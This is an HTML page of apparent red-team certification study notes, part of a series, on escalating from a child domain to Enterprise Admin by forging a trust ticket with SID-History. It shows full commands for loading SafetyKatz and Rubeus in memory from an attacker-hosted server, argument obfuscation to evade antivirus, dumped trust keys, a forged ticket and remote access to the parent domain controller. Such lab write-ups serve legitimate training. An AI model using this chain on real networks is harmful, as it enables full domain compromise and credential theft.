@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CRTP Part 16 - Enterprise Trust - SID-History with Trust Ticket | Mr Stark Study Notes</title>
+
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  
+  <style>
+    .goad-content {
+      max-width: 100%;
+      margin: 0 auto;
+      padding: 30px;
+      font-size: 20px;
+    }
+    
+    .goad-content h1 {
+      color: var(--white-2);
+      font-size: 36px;
+      margin-bottom: 25px;
+    }
+    
+    .goad-content h2 {
+      color: var(--orange-yellow-crayola);
+      font-size: 30px;
+      margin: 35px 0 20px 0;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--jet);
+    }
+    
+    .goad-content h3 {
+      color: var(--white-1);
+      font-size: 26px;
+      margin: 30px 0 15px 0;
+    }
+    
+    .goad-content h4 {
+      color: var(--white-2);
+      font-size: 24px;
+      margin: 25px 0 15px 0;
+    }
+    
+    .goad-content p {
+      color: var(--light-gray);
+      margin-bottom: 18px;
+      line-height: 1.8;
+      font-size: 20px;
+    }
+    
+    .goad-content code {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-family: 'Courier New', monospace;
+      font-size: 18px;
+    }
+    
+    .goad-content pre {
+      background: var(--eerie-black-2);
+      border: 1px solid var(--jet);
+      border-radius: 8px;
+      padding: 20px;
+      overflow-x: auto;
+      margin: 20px 0;
+      max-width: 100%;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+    }
+    
+    .goad-content pre code {
+      background: transparent;
+      color: var(--light-gray);
+      padding: 0;
+      font-size: 18px;
+    }
+    
+    .goad-content img {
+      max-width: 100%;
+      border-radius: 8px;
+      margin: 25px 0;
+      border: 1px solid var(--jet);
+    }
+    
+    .goad-content ul, .goad-content ol {
+      color: var(--light-gray);
+      margin: 20px 0;
+      padding-left: 40px;
+      font-size: 20px;
+    }
+    
+    .goad-content li {
+      margin-bottom: 10px;
+      color: var(--light-gray);
+    }
+    
+    .goad-content strong {
+      color: var(--white-2);
+    }
+    
+    .goad-content blockquote {
+      border-left: 3px solid var(--orange-yellow-crayola);
+      padding-left: 20px;
+      margin: 20px 0;
+      color: var(--light-gray);
+      font-style: italic;
+      font-size: 20px;
+    }
+    
+    .goad-sidebar-list {
+      list-style: none;
+      padding: 0;
+    }
+    
+    .goad-sidebar-list li {
+      margin-bottom: 8px;
+    }
+    
+    .goad-sidebar-list a {
+      color: var(--light-gray);
+      text-decoration: none;
+      display: block;
+      padding: 10px 15px;
+      border-radius: 8px;
+      transition: all 0.3s;
+      font-size: 16px;
+    }
+    
+    .goad-sidebar-list a:hover,
+    .goad-sidebar-list a.active {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+    }
+    
+    .goad-sidebar-list a.active {
+      background: var(--orange-yellow-crayola);
+      color: var(--eerie-black-1);
+      font-weight: var(--fw-500);
+    }
+    
+    .back-link {
+      color: var(--light-gray);
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 25px;
+      font-size: 16px;
+    }
+    
+    .back-link:hover {
+      color: var(--orange-yellow-crayola);
+    }
+  </style>
+</head>
+
+<body>
+
+  <main>
+
+    <!-- Sidebar -->
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTP Series</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Parts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        
+        <a href="../index.html" class="back-link">
+          <ion-icon name="arrow-back-outline"></ion-icon>
+          Back to Portfolio
+        </a>
+        
+        <div class="separator"></div>
+        
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Select Part:</p>
+        
+        <ul class="goad-sidebar-list">
+          <li><a href="index.html">Overview</a></li>
+          <li><a href="part-1-powershell-overview.html">PowerShell Overview</a></li>
+          <li><a href="part-2-powershell-detections.html">PowerShell Detections</a></li>
+          <li><a href="part-3-enumeration.html">Enumeration</a></li>
+          <li><a href="part-4-privilege-escalation.html">Privilege Escalation</a></li>
+          <li><a href="part-5-privesc-domain-admin.html">Privilege Escalation via Domain Admin</a></li>
+          <li><a href="part-6-golden-ticket.html">Golden Ticket</a></li>
+          <li><a href="part-7-silver-ticket.html">Silver Ticket</a></li>
+          <li><a href="part-8-diamond-ticket.html">Diamond Ticket</a></li>
+          <li><a href="part-9-dsrm-credentials.html">Abusing DSRM Credentials</a></li>
+          <li><a href="part-10-dcsync-attack.html">DCSync Attack</a></li>
+          <li><a href="part-11-security-descriptor.html">Security Descriptor Abuse</a></li>
+          <li><a href="part-12-asrep-roasting.html">ASREP-Roasting Attack</a></li>
+          <li><a href="part-13-unconstrained-delegation.html">Unconstrained Delegation</a></li>
+          <li><a href="part-14-constrained-delegation.html">Constrained Delegation</a></li>
+          <li><a href="part-15-rbcd.html">Resource-Based Constrained Delegation</a></li>
+          <li><a href="part-16-enterprise-trust-ticket.html" class="active">Enterprise Trust - SID-History with Trust Ticket</a></li>
+          <li><a href="part-17-enterprise-krbtgt.html">Enterprise Trust - SID-History with KRBTGT</a></li>
+          <li><a href="part-18-crossforest-trust.html">CrossForest Trust - Trust Flow</a></li>
+          <li><a href="part-19-adcs-attacks.html">ADCS Attacks</a></li>
+          <li><a href="part-20-trust-links.html">Trust Links Abuse</a></li>
+          <li><a href="part-21-mde-mdi-bypass.html">MDE/MDI Bypass</a></li>
+        </ul>
+
+        <div class="separator"></div>
+        
+        <ul class="social-list">
+          <li class="social-item">
+            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
+              <ion-icon name="logo-github"></ion-icon>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <!-- Main Content -->
+    <div class="main-content">
+
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Enterprise Trust - SID-History with Trust Ticket</header>
+        
+        <section class="goad-content">
+          
+<h1>CRTP - Certified Red Team Professional</h1>
+
+
+<h2>Enterprise Admins Trust  - SID-History Abuse with Trust Ticket</h2>
+
+
+<h3>What is SID-History Abuse?</h3>
+
+
+<p>SID-History Abuse is a technique that allows an attacker to escalate privileges and bypass access controls in Windows systems. It involves injecting higher-privileged Security Identifiers (SIDs) into the SID History attribute of a user account, effectively granting the user the permissions associated with those higher-privileged groups.</p>
+<h3>How SID-History Abuse Works</h3>
+
+
+<p>1. Compromising a Standard User Account: An attacker first compromises a standard user account with some level of privileges.</p>
+<p>1. Adding Higher-Privileged SIDs: The attacker then adds the SID of a higher-privileged group (such as Enterprise Admins or Domain Admins) to the SID History attribute of the compromised user account.</p>
+<p>1. Elevated Access: With the higher-privileged SIDs in the SID History, the user account now has elevated access to resources and systems within the parent domain.</p>
+<h3>SID-History Abuse using Trusted Tickets</h3>
+
+
+<p>The search results indicate that SID-History Abuse can be combined with the abuse of trusted tickets to further escalate privileges across domain boundaries:</p>
+<p>1. Compromising a Child Domain: An attacker first compromises a user account in a child domain within the same forest.</p>
+<p>1. Adding Parent Domain SIDs: The attacker adds the SID of a higher-privileged group from the parent domain (e.g., Enterprise Admins) to the SID History of the compromised user account.</p>
+<p>1. Forging a Trusted Ticket: The attacker then forges a Kerberos ticket that can be used to access resources in the parent domain, leveraging the added SIDs in the SID History.</p>
+<p>This combination of SID-History Abuse and trusted ticket forgery allows the attacker to effectively compromise the entire forest, as long as they can gain a foothold in a single child domain.</p>
+
+<h1>Enumeration</h1>
+
+
+<p>Ok so assuming that we already have Access as Domain Admin and we would like to privilege escalate to Enterprise Admin.</p>
+<p>To enumerate Domain Trusts we will be using PowerView Modules.</p>
+<p>. .\PowerView.ps1</p>
+<p>Get-DomainTrust</p>
+<img src="./images/screenshot_130.png" alt="">
+
+
+<p>The output from Get-DomainTrust provides detailed information about the forest trust between dollarcorp.moneycorp.local and moneycorp.local. </p>
+<p>Here's a breakdown of the fields:</p>
+<h3>Source and Target Names</h3>
+
+
+<p>1. SourceName: The name of the source domain, which is dollarcorp.moneycorp.local.</p>
+<p>1. TargetName: The name of the target domain, which is moneycorp.local.</p>
+<h3>Trust Type and Attributes</h3>
+
+
+<p>1. TrustType: The type of trust, which is WINDOWS_ACTIVE_DIRECTORY, indicating that it is a Windows Active Directory trust.</p>
+<p>1. TrustAttributes: The attributes of the trust, which are WITHIN_FOREST, indicating that the trust is within the same forest.</p>
+<h3>Trust Direction</h3>
+
+
+<p>1. TrustDirection: The direction of the trust, which is Bidirectional, indicating that the trust is bidirectional, allowing both domains to access resources in each other.</p>
+
+<p>Now that we have done the enumeration and we know exactly how is the Child/Parent domain trust configured, let’s carry on.</p>
+<p>We wont be doing this attack directly from de Domain Controller. We will be executing everything remotely from our Target machine.</p>
+
+
+<h3>Using PELoader.exe for args encoding.</h3>
+
+
+<p>Back to cmdlet, PELoader.exe is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute ArgSplit.bat first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
+
+<p>Let’s start by uploading PELoader.exe into Domain-Controller.</p>
+<p>echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Public\Loader.exe /Y</p>
+<img src="./images/screenshot_131.png" alt="">
+
+
+<p>Now let’s remotely access the Domain-Controller and activate Portforwarding to avoid AV and other security mechanisms.</p>
+<p>Accessing Domain Controller.</p>
+<p>winrs -r:dcorp-dc cmd</p>
+
+<p>Portforwarding inside DC. We will use PELoader.exe to execute payloads from memory on the target machine, as it allows you to avoid directly interacting with the target's local disk. By forwarding the connection to the remote machine, you can potentially bypass certain security controls or restrictions on the target system.</p>
+<p>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.51</p>
+<img src="./images/screenshot_132.png" alt="">
+
+
+<p>Let's go through the different flags used in the netsh interface portproxy add v4tov4 command:</p>
+<p>1. v4tov4: This specifies that the port forwarding is between IPv4 addresses. You can also use v6tov6 for IPv6 or v6tov4 and v4tov6 for mixed IPv4 and IPv6 scenarios.</p>
+<p>1. listenport:8080: This is the local port on the machine where the connection will be listened for. In your case, it's port 8080.</p>
+<p>1. listenaddress:0.0.0.0: This is the local IP address that the port will be listening on. Using 0.0.0.0 means it will listen on all available IP addresses on the machine.</p>
+<p>1. connectport:80: This is the port that the incoming connection on the local machine (port 8080) will be forwarded to. In your case, it's port 80.</p>
+<p>1. connectaddress:172.16.100.51: This is the IP address that the connection will be forwarded to. In your case, it's the IP address 172.16.100.51.</p>
+<p>The purpose of this port forwarding configuration is to redirect any connections made to the local machine on port 8080 to the remote machine at IP address 172.16.100.51 on port 80.</p>
+
+<p>Don’t forget to setup a listener in our target machine, this way the DC can access the SafetyKatz. I’ll be using HFS.exe for now but you can also use python or anything else.</p>
+<p>My HFS is listening on port 80.</p>
+<img src="./images/screenshot_133.png" alt="">
+
+
+
+<p>Now back to our attacking machine in cmdlet, let’s execute ArgSplit.bat to Encode our payload “lsadump::trust” and let’s copy/paste it into our winrs session to DC.</p>
+<p>The lsadump::trust command SafetyKatz.exe is used to dump the trust keys (passwords) for all associated trusts (domain/forest) when run on a Domain Controller. </p>
+<p>This command is particularly useful for inter-realm trust abuse, where an attacker can use the trust keys to forge trust tickets and gain access to resources across the trust boundary.</p>
+<pre><code>[!] Argument Limit: 180 characters
+[+] Enter a string: lsadump::trust
+set "z=t"
+set "y=s"
+set "x=u"
+set "w=r"
+set "v=t"
+set "u=:"
+set "t=:"
+set "s=p"
+set "r=m"
+set "q=u"
+set "p=d"
+set "o=a"
+set "n=s"
+set "m=l"
+set "Pwn=%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"</code></pre>
+
+
+<img src="./images/screenshot_134.png" alt="">
+
+
+
+<p>After encoding the paylod lsadump::trust word, we can get all the trust keys we have inside Domain Controller.</p>
+<p>C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pwn% /patch" "exit"</p>
+<pre><code>mimikatz(commandline) # lsadump::trust /patch
+
+Current domain: DOLLARCORP.MONEYCORP.LOCAL (dcorp / S-1-5-21-719815819-3726368948-3917688648)
+
+Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -&gt; MONEYCORP.LOCAL
+    * 6/4/2024 6:22:58 AM - CLEAR   - 62 d7 c6 a5 15 fb 76 34 f5 00 4e 99 19 de 5d ae 04 e4 42 b1 e8 a5 55 0b 0b 39 54 eb
+        * aes256_hmac       7f5975749f090a5dfca11c129cda9abf0214e7a2b9c4a566f2797d97266e2e4d
+        * aes128_hmac       80ed08fa8e8ef13c37fa06c41787fd5f
+        * rc4_hmac_nt       11584b767b6316e5f48b35e029c32ade
+
+ [ Out ] MONEYCORP.LOCAL -&gt; DOLLARCORP.MONEYCORP.LOCAL
+    * 6/4/2024 6:22:58 AM - CLEAR   - 62 d7 c6 a5 15 fb 76 34 f5 00 4e 99 19 de 5d ae 04 e4 42 b1 e8 a5 55 0b 0b 39 54 eb
+        * aes256_hmac       00b89c3a1249a3aa4180baee10e33e183ea4916315d8c71e12c5f6285c46cad0
+        * aes128_hmac       3ae361f350844d9132dc55d4daaa1c49
+        * rc4_hmac_nt       11584b767b6316e5f48b35e029c32ade
+
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -&gt; MONEYCORP.LOCAL
+    * 6/4/2024 6:22:56 AM - CLEAR   - 5b 9c 88 2c 73 e6 10 fb 65 79 6f 48 aa 44 d1 18 89 7a 87 f4 97 99 91 c5 ab 98 a7 11
+        * aes256_hmac       0c024bac1d35a41c856cb9dca37ba1833778182f2e90809b2c79f94609af1d84
+        * aes128_hmac       c4edc8a09c8b13b9ed02999f38638706
+        * rc4_hmac_nt       e3403939117948bfb16731f16c41c261
+
+ [Out-1] MONEYCORP.LOCAL -&gt; DOLLARCORP.MONEYCORP.LOCAL
+    * 6/4/2024 6:22:56 AM - CLEAR   - 5b 9c 88 2c 73 e6 10 fb 65 79 6f 48 aa 44 d1 18 89 7a 87 f4 97 99 91 c5 ab 98 a7 11
+        * aes256_hmac       b46bb7200992cbb5463c5206936cb7ddf6f93bf1f3618340a64c30fbdefd2bad
+        * aes128_hmac       f8103415a54c0e7e10ab7452e892fe05
+        * rc4_hmac_nt       e3403939117948bfb16731f16c41c261
+
+
+Domain: US.DOLLARCORP.MONEYCORP.LOCAL (US / S-1-5-21-1028785420-4100948154-1806204659)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -&gt; US.DOLLARCORP.MONEYCORP.LOCAL
+    * 6/4/2024 6:23:05 AM - CLEAR   - 97 f8 65 53 4a 83 9e 27 46 ce 48 dd b2 e1 b8 c9 ee bd 76 ba 6b 5e 68 51 3a ab 16 3f
+        * aes256_hmac       d594bdbdf43f709b7c17755c51723d982d6ced1d2929fbd3ea9edab82b35d4c1
+        * aes128_hmac       f0326d8925998e62132cad216e7db7ed
+        * rc4_hmac_nt       03a60f8686b725b4b335971d5eb3b744
+
+ [ Out ] US.DOLLARCORP.MONEYCORP.LOCAL -&gt; DOLLARCORP.MONEYCORP.LOCAL
+    * 6/4/2024 6:23:05 AM - CLEAR   - 97 f8 65 53 4a 83 9e 27 46 ce 48 dd b2 e1 b8 c9 ee bd 76 ba 6b 5e 68 51 3a ab 16 3f
+        * aes256_hmac       93545f14dd1e166acfbe9c1bc16b4681c14a5c47b1eecff141b3dfa750ce6155
+        * aes128_hmac       fd73c2b0e77cf05cd0fc87d60fa3586a
+        * rc4_hmac_nt       03a60f8686b725b4b335971d5eb3b744
+
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -&gt; US.DOLLARCORP.MONEYCORP.LOCAL
+    * 6/4/2024 6:23:00 AM - CLEAR   - dd 1f 44 bb 0b 3f 4c b3 34 d8 d3 70 7b 45 33 d5 02 3a e1 0a b3 e6 46 b6 e0 6b 5f ba
+        * aes256_hmac       ac334d01cf7e0c05beb73c1fe9a7ca4a89305ebb12c4a5a9c9e9f0fdac234797
+        * aes128_hmac       df2babb6d3e253cc33822ddbabd28262
+        * rc4_hmac_nt       eaeba7f85e8ede955c68372cf2b13a24
+
+ [Out-1] US.DOLLARCORP.MONEYCORP.LOCAL -&gt; DOLLARCORP.MONEYCORP.LOCAL
+    * 6/4/2024 6:23:00 AM - CLEAR   - dd 1f 44 bb 0b 3f 4c b3 34 d8 d3 70 7b 45 33 d5 02 3a e1 0a b3 e6 46 b6 e0 6b 5f ba
+        * aes256_hmac       a7786e1e0b45adf75c17fb2e92f0643890f49a19d9cea2bca51745d6c4b8b425
+        * aes128_hmac       85ec623f11bed99a5e06b3468330e7e3
+        * rc4_hmac_nt       eaeba7f85e8ede955c68372cf2b13a24
+
+
+Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-3333069040-3914854601-3606488808)
+ [  In ] DOLLARCORP.MONEYCORP.LOCAL -&gt; EUROCORP.LOCAL
+    * 6/4/2024 6:23:10 AM - CLEAR   - 7c 6b 2a 29 ab 68 39 5d b4 8f e8 a7 ea 03 67 d8 58 b9 34 9c e7 e2 80 dd 58 96 56 cc
+        * aes256_hmac       1f6bd80d7e906111d3a8386385f8f107edba618910e390a0fa3a84ba3864e40b
+        * aes128_hmac       fa8a7499a472e0ffecf908711d1399cc
+        * rc4_hmac_nt       d9eafe9914b32d5ffae65b4d049c98f2
+
+ [ Out ] EUROCORP.LOCAL -&gt; DOLLARCORP.MONEYCORP.LOCAL
+    * 6/4/2024 6:23:10 AM - CLEAR   - 7c 6b 2a 29 ab 68 39 5d b4 8f e8 a7 ea 03 67 d8 58 b9 34 9c e7 e2 80 dd 58 96 56 cc
+        * aes256_hmac       4c8f562a9d1fb21e67b1efc6b4b134555879e5a84a4691c6c9229ad0acbec941
+        * aes128_hmac       0976e9a059fd0e7ec736b1114eabbe2d
+        * rc4_hmac_nt       d9eafe9914b32d5ffae65b4d049c98f2
+
+ [ In-1] DOLLARCORP.MONEYCORP.LOCAL -&gt; EUROCORP.LOCAL
+    * 6/4/2024 6:22:59 AM - CLEAR   - e0 2f a2 bf 2d 5a c8 6a 64 2a 5d 29 41 9b 63 96 d0 8c b1 e8 60 41 eb a3 ac b3 44 11
+        * aes256_hmac       da32d30319101bfec097b0fc41cc69067bcb7bae2b0b1659cf955f4c45d3db71
+        * aes128_hmac       8957dda5e5cb54d55e3306134225d463
+        * rc4_hmac_nt       7ec54b13b25f8ea11d0228a7b2e13a44
+
+ [Out-1] EUROCORP.LOCAL -&gt; DOLLARCORP.MONEYCORP.LOCAL
+    * 6/4/2024 6:22:59 AM - CLEAR   - e0 2f a2 bf 2d 5a c8 6a 64 2a 5d 29 41 9b 63 96 d0 8c b1 e8 60 41 eb a3 ac b3 44 11
+        * aes256_hmac       4f940dc24662174c19836b1f4597640e9de8532bffac3a900d836c3de0d7f965
+        * aes128_hmac       d11ac5344115824ddcef61d3bb093b6d
+        * rc4_hmac_nt       7ec54b13b25f8ea11d0228a7b2e13a44</code></pre>
+
+
+<p>Above we can see that we were able to dump all keys/passwords for all associated trusts. Our focus so far is on child/Parent domain trust DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL(I have market the important one as Red above).</p>
+
+<p>Now that we do have the Trusted Key information, we can use Rubeus to forge our ticket with SID-History of Enterprise Admin.</p>
+<p>We will carry on from our attacking machine for now since we already have all the information needed.</p>
+
+<p>let’s use Argsplit.bat again to encode the word silver, for our Rubeus payload and copy/paste it.</p>
+<p>silver</p>
+<pre><code>[!] Argument Limit: 180 characters
+[+] Enter a string: silver
+set "z=r"
+set "y=e"
+set "x=v"
+set "w=l"
+set "v=i"
+set "u=s"
+set "Pwn=%u%%v%%w%%x%%y%%z%"</code></pre>
+
+
+
+<p>Now we can use PELoader.exe to import Rubeus and execute our payload from the memory.</p>
+<p>C:\AD\Tools>C:\AD\Tools\Loader.exe -path C:\Ad\Tools\Rubeus.exe -args %Pwn% /service:krbtgt/dollarcorp.moneycorp.local /rc4:11584b767b6316e5f48b35e029c32ade /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:administrator /nowrap</p>
+<img src="./images/screenshot_135.png" alt="">
+
+
+<pre><code>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</code></pre>
+
+
+<p>The flags used while using Rubeus to forge a ticket with SID-History of Enterprise Admin are:</p>
+<p>1. /service: This flag specifies the service principal name (SPN) of the service that the ticket is being forged for. In this case, it is krbtgt/dollarcorp.moneycorp.local.</p>
+<p>1. /rc4: This flag specifies the RC4 key used to encrypt the ticket(dollarcorp.moneycorp.local). In this case, it is 11584b767b6316e5f48b35e029c32ade.</p>
+<p>1. /sid: This flag specifies the SID of the user or group that the ticket is being forged for. In this case, it is S-1-5-21-719815819-3726368948-3917688648.</p>
+<p>1. /sids: This flag specifies additional SIDs that should be included in the ticket(moneycorp.local). In this case, it is S-1-5-21-335606122-960912869-3279953914-519.</p>
+<p>1. /ldap: This flag specifies that the ticket should be forged using LDAP.</p>
+<p>1. /user: This flag specifies the username of the user that the ticket is being forged for. In this case, it is administrator.</p>
+<p>1. /nowrap: This flag specifies that the output should not be wrapped.</p>
+<p>1. /ptt: This flag specifies that the ticket should be printed to the console.</p>
+<p>This command forges a ticket for the krbtgt/dollarcorp.moneycorp.local service using the RC4 key 11584b767b6316e5f48b35e029c32ade, the SID S-1-5-21-719815819-3726368948-3917688648, and the additional SID S-1-5-21-335606122-960912869-3279953914-519. The ticket is forged using LDAP and the username is administrator. The output is not wrapped and the ticket is printed to the console.</p>
+
+<p>if our payload works fine, then we have a base64 ticket. We can then use the same base64 ticket to request TGS from Parent Domain (moneycorp.local) Domain Controller, inject the ticket into our Cached Ticket and access the MoneyCorp.local Domain Controller.</p>
+<p>ArgSplit.bat</p>
+<p>asktgs</p>
+<pre><code>C:\AD\Tools&gt;ArgSplit.bat
+[!] Argument Limit: 180 characters
+[+] Enter a string: asktgs
+set "z=s"
+set "y=g"
+set "x=t"
+set "w=k"
+set "v=s"
+set "u=a"
+set "Pwn=%u%%v%%w%%x%%y%%z%"</code></pre>
+
+
+<p>Using Rubeus to request TGS for MCORP.LOCAL DC.</p>
+<p>C:\AD\Tools>C:\AD\Tools\Loader.exe -path C:\Ad\Tools\Rubeus.exe -args %Pwn% /service:http/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt /ticket:doIF7jCCBeqgAwIBB..BASE64_SNIPPET></p>
+<img src="./images/screenshot_136.png" alt="">
+
+
+<p>Now if we check our Cached Ticket.</p>
+<p>klist</p>
+<img src="./images/screenshot_137.png" alt="">
+
+
+<p>Above we can see that we do have the ticket injected into our current session. Let’s confirm it by tring to access MCORP-DC inside moneycorp.local domain using winrs.</p>
+
+<p>winrs -r:mcorp-dc.moneycorp.local cmd</p>
+<img src="./images/screenshot_138.png" alt="">
+
+
+<p>Above we were able to access the moneycorp DC, so we were able to abuse Domain Trust using Trusted Ticket.</p>
+
+
+
+<div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--jet); display: flex; justify-content: space-between;">
+  <a href="part-15-rbcd.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">&larr; Previous: Part 15</a>
+  <a href="part-17-enterprise-krbtgt.html" style="color: var(--orange-yellow-crayola); text-decoration: none;">Next: Part 17 &rarr;</a>
+</div>
+
+        </section>
+
+      </article>
+
+    </div>
+
+  </main>
+
+  <script src="../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+
+</body>
+
+</html>
